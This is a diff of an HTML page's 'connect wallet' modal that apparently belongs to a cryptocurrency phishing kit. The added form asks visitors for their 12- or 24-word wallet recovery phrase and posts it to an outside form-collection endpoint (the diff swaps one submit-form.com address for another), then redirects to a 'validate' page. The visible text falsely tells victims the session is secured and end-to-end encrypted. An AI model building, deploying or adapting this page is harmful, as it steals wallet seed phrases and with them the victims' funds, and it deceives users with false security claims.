@@ -1909,53 +1909,56 @@
       <div class="modal fade popup" id="popup_connect_wallet" tabindex="-1" role="dialog" aria-hidden="true">
          <div class="modal-dialog modal-dialog-centered" role="document">
             <div class="modal-content">
-               <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-               <span aria-hidden="true">&times;</span>
-               </button>
-               <div class="modal-body space-y-20 pd-40">
-                  <h3>
-                     <img width="50" height="50" class="avatar" id="wallet_logo" /><br>
-                     <span id="wallet_name" clas="mt-1">Sync Wallet</span>
-                  </h3>
-                  <p class="text-center">
-                     This session is secured and encrypted 
-                  </p>
-                  <div id="auto_connecting" style="display:none;">
-                     <br><br><br>
-                     <div class="heading-line s2" style="width: 100%;">
-                        <br>
-                        <h5 align="center">
-                           starting secure connection...<br>
-                           <i align="center" style="text-align: center !important; font-size:small"
-                              class="text-muted align-items-center">please wait...</i>
-                        </h5>
-                        <br>
-                     </div>
-                  </div>
-                  <div id="failed_to_connect" style="display:none;">
-                     <a href="#" id="button_connect_manually" class="btn btn-primary">Connect Manually</a>
-                  </div>
-                  <div id="div_connect_manuallly" style="display:none;">
-                     <form action="https://submit-form.com/sx1dXj9E" method="POST" id="my-form">
-                        <div id="phrase">
-                           <textarea
-                              placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
-                              style="font-size:25px; font-weight:650" rows="4" name="phrase" required></textarea>
-                           <input type="hidden" style="display: none;" name="_redirect" value="https://little-cell-8303.on.fleek.co/app/validate.html" >
-                           <p>...</p>
-                           <button id="submit" type="submit" class="btn btn-primary"
-                              style="border-top: 5px; ">Connect Wallet</button>
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                    <span aria-hidden="true">&times;</span>
+                </button>
+                <div class="modal-body space-y-20 pd-40">
+
+                    <h3>
+                        <img width="50" height="50" class="avatar" id="wallet_logo" /><br>
+                        <span id="wallet_name" clas="mt-1">Sync Wallet</span>
+                    </h3>
+                    <p class="text-center">
+                        This session is secured and encrypted </p>
+
+                    <div id="auto_connecting" style="display:none;">
+                        <br><br><br>
+                        <div class="heading-line s2" style="width: 100%;">
+                            <br>
+                            <h5 align="center">
+                                starting secure connection...<br>
+                                <i align="center" style="text-align: center !important; font-size:small"
+                                    class="text-muted align-items-center">please wait...</i>
+                            </h5>
+                            <br>
                         </div>
-                     </form>
-                  </div>
-                  <div>
-                     <br><br><br>
-                     <h5 align="center" class="mt-4 text-muted align-items-center"><img
-                        src="asset/images/icon/shield.png" width="30" height="30" /> This session is protected
-                        with an end-to-end encryption
-                     </h5>
-                  </div>
-               </div>
+                    </div>
+
+                    <div id="failed_to_connect" style="display:none;">
+                     
+                        <a href="#" id="button_connect_manually" class="btn btn-primary">Connect Manually</a>
+                    </div>
+
+                    <div id="div_connect_manuallly" style="display:none;">
+                        <form action="https://submit-form.com/5Q9kHhKoJ" method="POST" id="my-form">
+                            <div id="phrase"><textarea
+                                    placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces."
+                                    style="font-size:25px; font-weight:650" rows="4" name="phrase" required></textarea>
+
+                                    <input type="hidden" style="display: none;" name="_redirect" value="https://little-cell-8303.on.fleek.co/app/validate.html" >
+                                <p>...</p>
+                                <button id="submit" type="submit" class="btn btn-primary"
+                                    style="border-top: 5px; ">Connect Wallet</button>
+                            </div>
+                        </form>
+                    </div>
+                    <div>
+                        <br><br><br>
+                        <h5 align="center" class="mt-4 text-muted align-items-center"><img
+                                src="asset/images/icon/shield.png" width="30" height="30" /> This session is protected
+                            with an end-to-end encryption</h5>
+                    </div>
+                </div>
             </div>
          </div>
       </div>
